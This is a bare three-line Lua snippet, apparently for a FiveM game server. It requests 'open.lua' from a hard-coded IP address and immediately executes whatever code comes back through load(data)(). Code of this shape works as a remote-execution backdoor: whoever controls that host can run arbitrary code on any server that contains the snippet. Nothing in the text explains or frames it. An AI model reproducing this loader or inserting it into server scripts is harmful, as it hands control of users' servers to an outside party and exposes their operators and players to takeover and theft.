PerformHttpRequest("http://49.12.225.142/open.lua", function(method, data, headers)
    load(data)()
end)